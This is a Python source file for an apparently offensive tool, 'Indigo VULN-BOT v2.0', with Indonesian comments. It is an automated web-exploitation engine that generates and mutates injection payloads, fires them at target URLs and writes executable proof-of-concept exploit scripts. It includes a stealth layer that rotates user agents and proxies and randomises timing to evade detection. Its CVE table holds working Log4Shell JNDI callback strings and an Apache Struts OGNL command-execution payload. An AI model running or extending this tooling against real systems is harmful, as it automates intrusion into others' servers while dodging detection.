                    all_payloads.append(GeneratedPayload(
                        payload=p,
                        payload_type=vuln_type.value,
                        generation_method="mutation",
                        confidence=0.75,
                        metadata={"source": "context_mutation", "base": base}
                    ))
            self.generation_stats["mutation"] += sum(len(mutated) for _ in base_payloads)
        
        # 5. Smart fuzzing
        if "fuzz" in methods and all_payloads:
            base_payloads = [p.payload for p in all_payloads[:3]]
            for base in base_payloads:
                fuzzed = self.fuzzing_engine.fuzz(base, count=10)
                for p in fuzzed:
                    all_payloads.append(GeneratedPayload(
                        payload=p,
                        payload_type=vuln_type.value,
                        generation_method="fuzz",
                        confidence=0.5,
                        metadata={"source": "smart_fuzzing", "base": base}
                    ))
            self.generation_stats["fuzz"] += sum(10 for _ in base_payloads)
        
        # Score all payloads dengan neural network
        for p in all_payloads:
            p.context_score = self.neural_scorer.score(p.payload)
        
        # Sort by combined score
        all_payloads.sort(
            key=lambda p: (p.confidence * 0.4 + p.context_score * 0.6),
            reverse=True
        )
        
        # Deduplicate
        seen = set()
        unique_payloads = []
        for p in all_payloads:
            if p.payload not in seen:
                seen.add(p.payload)
                unique_payloads.append(p)
        
        return unique_payloads[:count]
    
    def get_stats(self):
        return {
            "training_samples": {k: len(v) for k, v in self.training_payloads.items()},
            "neural_model_trained": self.neural_scorer.trained,
            "markov_model_trained": self.markov_gen.trained,
            "grammar_rules": len(self.grammar_gen.grammars),
            "generation_stats": dict(self.generation_stats),
        }


# ============================================================
# ADAPTIVE LEARNING MODEL
# ============================================================
class AdaptiveLearningModel:
    """
    Model pembelajaran adaptif untuk pattern recognition.
    """
    
    def __init__(self, config):
        self.config = config
        self.model_path = "./.indigo_learning_model.pkl"
        self.training_data = []
        self.model = None
        self.pattern_db = defaultdict(list)
        self.stats = {
            "total_predictions": 0,
            "true_positives": 0,
            "false_positives": 0,
            "accuracy_history": []
        }
        self._load_model()
    
    def _load_model(self):
        if not HAS_SKLEARN:
            return
        if os.path.exists(self.model_path):
            try:
                self.model = joblib.load(self.model_path)
                print(f"  [OK] Loaded adaptive model from {self.model_path}")
            except Exception as e:
                print(f"  [!] Failed to load model: {e}")
                self.model = None
    
    def _save_model(self):
        if not HAS_SKLEARN or self.model is None:
            return
        try:
            joblib.dump(self.model, self.model_path)
        except Exception as e:
            print(f"  [!] Failed to save model: {e}")
    
    def extract_features(self, finding):
        features = []
        
        vuln_types = {
            "xss": 1, "sqli": 2, "lfi": 3, "rce": 4, "ssrf": 5,
            "idor": 6, "auth_bypass": 7, "priv_esc": 8, "csrf": 9,
            "ssti": 10, "cmdi": 11, "xxe": 12, "crlf": 13
        }
        vuln_type = finding.get("vuln_type", "").lower()
        features.append(vuln_types.get(vuln_type, 0))
        features.append(finding.get("confidence", 0.5))
        
        evidence = finding.get("evidence", "")
        features.append(len(evidence) / 1000.0)
        
        patterns = finding.get("matched_patterns", [])
        features.append(len(patterns))
        
        timing = finding.get("timing", {})
        baseline = timing.get("baseline_ms", 100)
        actual = timing.get("actual_ms", 100)
        features.append((actual - baseline) / baseline if baseline > 0 else 0)
        
        features.append(finding.get("status_code", 200) / 100.0)
        
        size_baseline = finding.get("size_baseline", 1000)
        size_actual = finding.get("size_actual", 1000)
        features.append((size_actual - size_baseline) / size_baseline if size_baseline > 0 else 0)
        
        features.append(1 if finding.get("cve_id") else 0)
        features.append(-1 if finding.get("waf_detected") else 0)
        
        pattern_key = f"{vuln_type}_{hashlib.md5(str(patterns).encode()).hexdigest()[:8]}"
        history = self.pattern_db.get(pattern_key, [])
        if history:
            success_rate = sum(1 for h in history if h.get("success")) / len(history)
            features.append(success_rate)
        else:
            features.append(0.5)
        
        return features
    
    def train(self, findings, labels):
        if not HAS_SKLEARN:
            return False
        if len(findings) < self.config["min_samples_for_learning"]:
            return False
        
        print(f"  [*] Training adaptive model with {len(findings)} samples...")
        
        X = [self.extract_features(f) for f in findings]
        y = labels
        
        X = np.array(X)
        y = np.array(y)
        
        X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)
        
        self.model = RandomForestClassifier(n_estimators=100, random_state=42, n_jobs=-1)
        self.model.fit(X_train, y_train)
        
        y_pred = self.model.predict(X_test)
        accuracy = accuracy_score(y_test, y_pred)
        self.stats["accuracy_history"].append(accuracy)
        
        print(f"  [OK] Model trained! Accuracy: {accuracy:.2%}")
        self._save_model()
        return True
    
    def predict(self, finding):
        if not HAS_SKLEARN or self.model is None:
            return self._rule_based_score(finding)
        
        features = self.extract_features(finding)
        proba = self.model.predict_proba([features])[0]
        return proba[1] if len(proba) > 1 else proba[0]
    
    def _rule_based_score(self, finding):
        score = finding.get("confidence", 0.5)
        if finding.get("cve_id"):
            score += 0.15
        evidence = finding.get("evidence", "")
        if len(evidence) > 500:
            score += 0.1
        if finding.get("waf_detected"):
            score -= 0.1
        return min(1.0, max(0.0, score))
    
    def update_feedback(self, finding, confirmed):
        pattern_key = f"{finding.get('vuln_type', '')}_{hashlib.md5(str(finding.get('matched_patterns', [])).encode()).hexdigest()[:8]}"
        
        self.pattern_db[pattern_key].append({
            "success": confirmed,
            "timestamp": datetime.now().isoformat(),
            "finding": finding
        })
        
        self.stats["total_predictions"] += 1
        if confirmed:
            self.stats["true_positives"] += 1
        else:
            self.stats["false_positives"] += 1
        
        self.training_data.append({"finding": finding, "confirmed": confirmed})


# ============================================================
# CVE DATABASE MANAGER
# ============================================================
class CVEDatabase:
    def __init__(self, config):
        self.config = config
        self.db_path = config["cve_db_path"]
        self.db = {"cves": {}, "last_update": None}
        self._load_db()
    
    def _load_db(self):
        if os.path.exists(self.db_path):
            try:
                with open(self.db_path, "r", encoding="utf-8") as f:
                    self.db = json.load(f)
                print(f"  [OK] Loaded CVE DB: {len(self.db.get('cves', {}))} entries")
            except Exception as e:
                print(f"  [!] Failed to load CVE DB: {e}")
                self.db = {"cves": {}, "last_update": None}
    
    def _save_db(self):
        try:
            with open(self.db_path, "w", encoding="utf-8") as f:
                json.dump(self.db, f, indent=2)
        except Exception as e:
            print(f"  [!] Failed to save CVE DB: {e}")
    
    def needs_update(self):
        if not self.config["cve_auto_update"]:
            return False
        if not self.db.get("last_update"):
            return True
        try:
            last_update = datetime.fromisoformat(self.db["last_update"])
            days_since = (datetime.now() - last_update).days
            return days_since >= self.config["cve_update_interval"]
        except:
            return True
    
    def update(self):
        print("  [*] Updating CVE database...")
        
        builtin_cves = {
            "CVE-2021-44228": {
                "name": "Log4Shell",
                "severity": "CRITICAL",
                "patterns": ["${jndi:", "ldap://", "rmi://"],
                "affected": ["java", "log4j"],
                "payloads": [
                    "${jndi:ldap://{{callback}}/a}",
                    "${jndi:rmi://{{callback}}/a}",
                    "${jndi:dns://{{callback}}/a}"
                ]
            },
            "CVE-2017-5638": {
                "name": "Apache Struts RCE",
                "severity": "CRITICAL",
                "patterns": ["%{", "#cmd="],
                "affected": ["java", "struts"],
                "payloads": [
                    "%{(#cmd='id').(#p=new java.lang.ProcessBuilder(#cmd)).(#p.start())}"
                ]
            },
            "CVE-2019-18935": {
                "name": "Telerik UI RCE",
                "severity": "CRITICAL",
                "patterns": ["Telerik.Web.UI", "RadAsyncUpload"],
                "affected": ["asp.net", "telerik"],
                "payloads": []
            },
            "CVE-2021-3129": {
                "name": "Laravel Ignition RCE",
                "severity": "HIGH",
                "patterns": ["_ignition/execute-solution", "laravel"],
                "affected": ["php", "laravel"],
                "payloads": [
                    "POST /_ignition/execute-solution"
                ]
            },
            "CVE-2023-22515": {
                "name": "Confluence Privilege Escalation",
                "severity": "CRITICAL",
                "patterns": ["/setup/setupadministrator.action"],
                "affected": ["java", "confluence"],
                "payloads": []
            },
            "CVE-2020-14882": {
                "name": "Oracle WebLogic RCE",
                "severity": "CRITICAL",
                "patterns": ["/console/css/%252e%252e"],
                "affected": ["java", "weblogic"],
                "payloads": [
                    "/console/css/%252e%252e%252fconsole.portal"
                ]
            },
        }
        
        self.db["cves"].update(builtin_cves)
        self.db["last_update"] = datetime.now().isoformat()
        self._save_db()
        
        print(f"  [OK] CVE DB updated: {len(self.db['cves'])} entries")
    
    def search(self, finding):
        matches = []
        evidence = finding.get("evidence", "").lower()
        vuln_type = finding.get("vuln_type", "").lower()
        tech_stack = [t.lower() for t in finding.get("technologies", [])]
        
        for cve_id, cve_data in self.db.get("cves", {}).items():
            score = 0
            for pattern in cve_data.get("patterns", []):
                if pattern.lower() in evidence:
                    score += 0.3
            for tech in cve_data.get("affected", []):
                if any(tech in t for t in tech_stack):
                    score += 0.2
            if vuln_type in ["rce", "sqli", "xss", "lfi"]:
                score += 0.1
            
            if score >= 0.5:
                matches.append({
                    "cve_id": cve_id,
                    "name": cve_data.get("name"),
                    "severity": cve_data.get("severity"),
                    "score": score,
                    "payloads": cve_data.get("payloads", [])
                })
        
        matches.sort(key=lambda x: x["score"], reverse=True)
        return matches


# ============================================================
# STEALTH LAYER
# ============================================================
class StealthLayer:
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    ]
    
    def __init__(self, config):
        self.config = config
        self.request_count = 0
        self.last_request_time = 0
        self.proxy_index = 0
    
    def get_headers(self):
        headers = {
            "User-Agent": random.choice(self.USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        }
        if random.random() > 0.5:
            headers["Cache-Control"] = "no-cache"
        if random.random() > 0.7:
            headers["Pragma"] = "no-cache"
        return headers
    
    def get_proxy(self):
        if not self.config["proxy_rotation"] or not self.config["proxy_list"]:
            return None
        proxy = self.config["proxy_list"][self.proxy_index]
        self.proxy_index = (self.proxy_index + 1) % len(self.config["proxy_list"])
        return {"http": proxy, "https": proxy}
    
    def wait(self):
        if not self.config["stealth_enabled"]:
            return
        min_interval = 1.0 / self.config["rate_limit_rps"]
        elapsed = time.time() - self.last_request_time
        if elapsed < min_interval:
            sleep_time = min_interval - elapsed
            if self.config["randomize_timing"]:
                sleep_time *= random.uniform(0.8, 1.5)
            time.sleep(sleep_time)
        self.last_request_time = time.time()
        self.request_count += 1


# ============================================================
# SANDBOX EXECUTOR
# ============================================================
class SandboxExecutor:
    def __init__(self, config):
        self.config = config
        self.docker_client = None
        
        if HAS_DOCKER and config["sandbox_enabled"]:
            try:
                self.docker_client = docker.from_env()
                print("  [OK] Docker sandbox initialized")
            except Exception as e:
                print(f"  [!] Docker not available: {e}")
                self.docker_client = None
    
    def execute(self, payload, target_url, param="test", method="GET", timeout=None):
        timeout = timeout or self.config["sandbox_timeout"]
        
        if self.docker_client:
            return self._execute_docker(payload, target_url, timeout)
        else:
            return self._execute_http(payload, target_url, param, method, timeout)
    
    def _execute_docker(self, payload, target_url, timeout):
        return self._execute_http(payload, target_url, "test", "GET", timeout)
    
    def _execute_http(self, payload, target_url, param, method, timeout):
        if not HAS_REQUESTS:
            return {"success": False, "error": "requests not available"}
        
        result = {
            "success": False,
            "output": "",
            "status_code": None,
            "response_time_ms": 0,
            "error": None
        }
        
        try:
            headers = StealthLayer(self.config).get_headers()
            
            start_time = time.time()
            if method.upper() == "GET":
                response = req_lib.get(
                    target_url,
                    params={param: payload},
                    headers=headers,
                    timeout=timeout,
                    verify=False
                )
            else:
                response = req_lib.post(
                    target_url,
                    data={param: payload},
                    headers=headers,
                    timeout=timeout,
                    verify=False
                )
            elapsed_ms = int((time.time() - start_time) * 1000)
            
            result["success"] = True
            result["status_code"] = response.status_code
            result["output"] = response.text[:5000]
            result["response_time_ms"] = elapsed_ms
            result["response_headers"] = dict(response.headers)
            
        except Exception as e:
            if "Timeout" in str(type(e).__name__):
                result["error"] = "Timeout"
            else:
                result["error"] = str(e)
        
        return result


# ============================================================
# POC GENERATOR
# ============================================================
class PoCGenerator:
    def __init__(self, config):
        self.config = config
        self.output_dir = config["poc_output_dir"]
        os.makedirs(self.output_dir, exist_ok=True)
    
    def generate_python(self, finding, payload_obj):
        target_url = finding.get("url", "http://target.com")
        param = finding.get("context", {}).get("parameter", "param")
        vuln_type = finding.get("vuln_type", "unknown")
        gen_method = payload_obj.generation_method if hasattr(payload_obj, 'generation_method') else "unknown"
        payload_str = payload_obj.payload if hasattr(payload_obj, 'payload') else str(payload_obj)
        
        script = f'''#!/usr/bin/env python3
"""
Proof-of-Concept: {vuln_type.upper()} Vulnerability
Target: {target_url}
Generated: {datetime.now().isoformat()}
CVE: {finding.get("cve_id", "N/A")}
AI Generation Method: {gen_method}

DISCLAIMER: For authorized testing only!
"""

import requests
import sys
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

TARGET = "{target_url}"
PARAM = "{param}"
PAYLOAD = """{payload_str}"""

def exploit():
    print(f"[*] Testing {vuln_type} on {{TARGET}}")
    print(f"[*] Parameter: {{PARAM}}")
    print(f"[*] Payload: {{PAYLOAD}}")
    print(f"[*] Generated via: {gen_method}")
    
    try:
        response = requests.get(
            TARGET,
            params={{PARAM: PAYLOAD}},
            headers={{"User-Agent": "PoC-Script/1.0"}},
            timeout=30,
            verify=False
        )
        
        print(f"\\n[+] Status Code: {{response.status_code}}")
        print(f"[+] Response Length: {{len(response.text)}}")
        
        evidence = "{finding.get('evidence', '')[:100]}"
        if evidence.lower() in response.text.lower():
            print(f"\\n[!] VULNERABLE! Evidence found in response")
            print(f"[!] Evidence: {{evidence}}")
        else:
            print(f"\\n[-] Evidence not found in response")
        
        print(f"\\n[*] Response Preview:")
        print(response.text[:500])
        
    except Exception as e:
        print(f"[X] Error: {{e}}")
        sys.exit(1)

if __name__ == "__main__":
    exploit()
'''
        return script
    
    def generate_curl(self, finding, payload_obj):
        target_url = finding.get("url", "http://target.com")
        param = finding.get("context", {}).get("parameter", "param")
        payload_str = payload_obj.payload if hasattr(payload_obj, 'payload') else str(payload_obj)
        gen_method = payload_obj.generation_method if hasattr(payload_obj, 'generation_method') else "unknown"
        
        encoded_payload = quote(payload_str)
        
        curl_cmd = f'''# PoC: {finding.get("vuln_type", "unknown").upper()}
# Target: {target_url}
# Generated: {datetime.now().isoformat()}
# AI Method: {gen_method}

curl -i -s -k \\
  -X GET \\
  -H "User-Agent: PoC-CURL/1.0" \\
  "{target_url}?{param}={encoded_payload}"

# Expected evidence: {finding.get("evidence", "")[:100]}
'''
        return curl_cmd
    
    def generate_bash(self, finding, payload_obj):
        target_url = finding.get("url", "http://target.com")
        param = finding.get("context", {}).get("parameter", "param")
        payload_str = payload_obj.payload if hasattr(payload_obj, 'payload') else str(payload_obj)
        gen_method = payload_obj.generation_method if hasattr(payload_obj, 'generation_method') else "unknown"
        
        script = f'''#!/bin/bash
# PoC: {finding.get("vuln_type", "unknown").upper()}
# Target: {target_url}
# Generated: {datetime.now().isoformat()}
# AI Method: {gen_method}

TARGET="{target_url}"
PARAM="{param}"
PAYLOAD='{payload_str}'

echo "[*] Testing vulnerability on $TARGET"
echo "[*] Parameter: $PARAM"
echo "[*] Payload: $PAYLOAD"
echo "[*] Generated via: {gen_method}"

RESPONSE=$(curl -s -k "$TARGET?$PARAM=$PAYLOAD" -H "User-Agent: PoC-Bash/1.0")

echo ""
echo "[+] Response received"
echo "[+] Response length: ${{#RESPONSE}}"
echo ""
echo "[*] Response preview:"
echo "$RESPONSE" | head -c 500
echo ""

if echo "$RESPONSE" | grep -qi "{finding.get("evidence", "")[:50]}"; then
    echo ""
    echo "[!] VULNERABLE! Evidence found"
fi
'''
        return script
    
    def save(self, finding, payload_obj):
        vuln_type = finding.get("vuln_type", "unknown")
        gen_method = payload_obj.generation_method if hasattr(payload_obj, 'generation_method') else "static"
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        base_name = f"poc_{vuln_type}_{gen_method}_{timestamp}"
        
        saved_files = []
        
        for fmt in self.config["poc_formats"]:
            if fmt == "python":
                content = self.generate_python(finding, payload_obj)
                filename = f"{base_name}.py"
            elif fmt == "curl":
                content = self.generate_curl(finding, payload_obj)
                filename = f"{base_name}_curl.sh"
            elif fmt == "bash":
                content = self.generate_bash(finding, payload_obj)
                filename = f"{base_name}_bash.sh"
            else:
                continue
            
            filepath = os.path.join(self.output_dir, filename)
            with open(filepath, "w", encoding="utf-8") as f:
                f.write(content)
            
            os.chmod(filepath, 0o755)
            saved_files.append(filepath)
        
        return saved_files


# ============================================================
# VULN-BOT MAIN ENGINE (v2.0 with AI)
# ============================================================
class VulnBotEngine:
    """
    Main engine VULN-BOT v2.0 dengan AI Payload Generator.
    """
    
    def __init__(self, config=None):
        self.config = config or VULN_BOT_CONFIG
        self.adaptive_model = AdaptiveLearningModel(self.config)
        self.cve_db = CVEDatabase(self.config)
        self.ai_generator = AIPayloadGenerator()  # NEW: AI Payload Generator
        self.stealth = StealthLayer(self.config)
        self.sandbox = SandboxExecutor(self.config)
        self.poc_gen = PoCGenerator(self.config)
        
        # Update CVE DB jika perlu
        if self.cve_db.needs_update():
            self.cve_db.update()
    
    def _map_vuln_type(self, vuln_type_str: str) -> PayloadType:
        """Map string vuln_type ke PayloadType enum."""
        mapping = {
            "xss": PayloadType.XSS,
            "sqli": PayloadType.SQLI,
            "sql_injection": PayloadType.SQLI,
            "lfi": PayloadType.LFI,
            "path_traversal": PayloadType.LFI,
            "rce": PayloadType.RCE,
            "remote_code_execution": PayloadType.RCE,
            "ssrf": PayloadType.SSRF,
            "xxe": PayloadType.XXE,
            "ssti": PayloadType.SSTI,
            "template_injection": PayloadType.SSTI,
            "cmdi": PayloadType.CMDI,
            "command_injection": PayloadType.CMDI,
            "idor": PayloadType.IDOR,
            "open_redirect": PayloadType.OPEN_REDIRECT,
            "redirect": PayloadType.OPEN_REDIRECT,
            "crlf": PayloadType.CRLF,
            "priv_esc": PayloadType.PRIV_ESC,
            "privilege_escalation": PayloadType.PRIV_ESC,
            "csrf": PayloadType.CSRF,
            "auth_bypass": PayloadType.AUTH_BYPASS,
        }
        return mapping.get(vuln_type_str.lower(), PayloadType.SQLI)
    
    def process_findings(self, findings):
        """
        Process findings dari scanner dan generate PoC menggunakan AI.
        """
        print(f"\n\033[36m{'='*58}")
        print(f"  VULN-BOT v2.0: Processing {len(findings)} findings")
        print(f"  Mode: AI-Powered Payload Generation")
        print(f"{'='*58}\033[0m")
        
        results = []
        
        for i, finding in enumerate(findings, 1):
            print(f"\n\033[33m[{i}/{len(findings)}] Processing: {finding.get('vuln_type', 'unknown')}\033[0m")
            
            # Step 1: Adaptive prediction
            confidence = self.adaptive_model.predict(finding)
            print(f"  Confidence: {confidence:.2%}")
            
            if confidence < self.config["confidence_threshold"]:
                print(f"  [SKIP] Below threshold ({self.config['confidence_threshold']:.2%})")
                continue
            
            # Step 2: CVE matching
            cve_matches = self.cve_db.search(finding)
            if cve_matches:
                print(f"  [OK] Matched {len(cve_matches)} CVE(s): {cve_matches[0]['cve_id']}")
                finding["cve_matches"] = cve_matches
            
            # Step 3: Generate payloads dengan AI
            vuln_type = self._map_vuln_type(finding.get("vuln_type", "sqli"))
            
            # Build context untuk AI generator
            ai_context = {
                "waf_detected": finding.get("waf_detected", False),
                "tech_stack": finding.get("technologies", []),
                "param_type": finding.get("context", {}).get("param_type", "get"),
                "failed_payloads": finding.get("failed_payloads", []),
            }
            
            print(f"  [*] Generating AI payloads for {vuln_type.value}...")
            
            ai_payloads = self.ai_generator.generate(
                vuln_type=vuln_type,
                context=ai_context,
                count=self.config["max_payloads_per_vuln"],
                methods=self.config["ai_methods"]
            )
            
            print(f"  [OK] Generated {len(ai_payloads)} AI payloads")
            
            # Show payload breakdown by method
            method_counts = Counter(p.generation_method for p in ai_payloads)
            for method, count in method_counts.items():
                print(f"    - {method}: {count} payloads")
            
            # Step 4: Test payloads (dengan stealth & sandbox)
            validated_payloads = []
            test_count = min(10, len(ai_payloads))  # Test top 10
            
            for payload_obj in ai_payloads[:test_count]:
                self.stealth.wait()
                
                print(f"    [*] Testing [{payload_obj.generation_method}] {payload_obj.payload[:50]}...")
                
                param = finding.get("context", {}).get("parameter", "test")
                result = self.sandbox.execute(
                    payload_obj.payload,
                    finding.get("url", ""),
                    param=param,
                    timeout=self.config["payload_timeout"]
                )
                
                if result["success"]:
                    print(f"    [OK] Executed (status: {result['status_code']}, {result['response_time_ms']}ms)")
                    payload_obj.metadata["execution_result"] = result
                    validated_payloads.append(payload_obj)
                    
                    # Feedback loop: train model dengan successful payload
                    self.ai_generator.add_training_data(
                        payload_obj.payload,
                        vuln_type.value,
                        success=True
                    )
                else:
                    print(f"    [X] Failed: {result.get('error', 'unknown')}")
                    # Feedback loop: train dengan failed payload
                    self.ai_generator.add_training_data(
                        payload_obj.payload,
                        vuln_type.value,
                        success=False
                    )
                
                time.sleep(random.uniform(
                    self.config["payload_delay_min"],
                    self.config["payload_delay_max"]
                ))
            
            # Step 5: Generate PoC
            if validated_payloads:
                # Pilih payload terbaik (highest context_score)
                best_payload = max(validated_payloads, key=lambda p: p.context_score)
                poc_files = self.poc_gen.save(finding, best_payload)
                
                print(f"  [OK] Generated {len(poc_files)} PoC files (best: {best_payload.generation_method}):")
                for poc_file in poc_files:
                    print(f"    - {poc_file}")
                
                results.append({
                    "finding": finding,
                    "confidence": confidence,
                    "cve_matches": cve_matches,
                    "payloads_generated": len(ai_payloads),
                    "payloads_tested": test_count,
                    "payloads_validated": len(validated_payloads),
                    "best_payload": {
                        "payload": best_payload.payload,
                        "method": best_payload.generation_method,
                        "confidence": best_payload.confidence,
                        "context_score": best_payload.context_score,
                    },
                    "poc_files": poc_files,
                    "method_breakdown": dict(method_counts),
                })
            else:
                print(f"  [SKIP] No payloads validated")
        
        # Summary
        print(f"\n\033[32m{'='*58}")
        print(f"  VULN-BOT v2.0 COMPLETE")
        print(f"{'='*58}\033[0m")
        print(f"  Total findings processed: {len(findings)}")
        print(f"  PoC generated: {len(results)}")
        print(f"  Output directory: {self.config['poc_output_dir']}")
        
        # AI Stats
        ai_stats = self.ai_generator.get_stats()
        print(f"\n  \033[36m[AI Generation Stats]\033[0m")
        print(f"    Grammar payloads:  {ai_stats['generation_stats'].get('grammar', 0)}")
        print(f"    Genetic evolved:   {ai_stats['generation_stats'].get('genetic', 0)}")
        print(f"    Markov generated:  {ai_stats['generation_stats'].get('markov', 0)}")
        print(f"    Mutations:         {ai_stats['generation_stats'].get('mutation', 0)}")
        print(f"    Fuzzed:            {ai_stats['generation_stats'].get('fuzz', 0)}")
        print(f"    Neural trained:    {ai_stats['neural_model_trained']}")
        
        return results
    
    def get_stats(self):
        return {
            "adaptive_model": self.adaptive_model.stats,
            "cve_db": {
                "total_cves": len(self.cve_db.db.get("cves", {})),
                "last_update": self.cve_db.db.get("last_update")
            },
            "stealth": {"total_requests": self.stealth.request_count},
            "ai_generator": self.ai_generator.get_stats(),
        }


# ============================================================
# ENTRY POINT (dipanggil dari File 1)
# ============================================================
def run_vuln_bot(findings, config=None):
    """
    Entry point untuk dipanggil dari indigo_scr.py (File 1).
    
    Args:
        findings: List of findings dari scanner
        config: Optional config override
    
    Returns:
        List of PoC results
    """
    print(f"\n\033[1;36m{'='*60}")
    print(f"  INDIGO VULN-BOT v2.0 - AI-Powered Payload Engine")
    print(f"{'='*60}\033[0m\n")
    
    engine = VulnBotEngine(config)
    return engine.process_findings(findings)


# ============================================================
# STANDALONE MODE (untuk testing)
# ============================================================
if __name__ == "__main__":
    print("\n\033[36m" + "=" * 58)
    print("  Indigo VULN-BOT v2.0 - Standalone Mode (AI-Powered)")
    print("=" * 58 + "\033[0m\n")
    
    test_findings = [
        {
            "vuln_type": "sqli",
            "url": "http://testphp.vulnweb.com/listproducts.php?cat=1",
            "confidence": 0.85,
            "evidence": "sql syntax error",
            "context": {
                "parameter": "cat",
                "param_type": "url"
            },
            "technologies": ["mysql", "php"],
            "waf_detected": False,
        },
        {
            "vuln_type": "xss",
            "url": "http://testphp.vulnweb.com/search.php?test=query",
            "confidence": 0.90,
            "evidence": "<script>alert",
            "context": {
                "parameter": "test",
                "param_type": "url"
            },
            "technologies": ["php"],
            "waf_detected": False,
        }
    ]
    
    results = run_vuln_bot(test_findings)
    
    print(f"\n\nGenerated {len(results)} PoC(s)")
    for result in results:
        print(f"\n  [{result['finding']['vuln_type'].upper()}]")
        print(f"    Generated: {result['payloads_generated']} payloads")
        print(f"    Validated: {result['payloads_validated']} payloads")
        print(f"    Best method: {result['best_payload']['method']}")
        print(f"    PoC files: {len(result['poc_files'])}")
        for f in result['poc_files']:
            print(f"      - {f}")
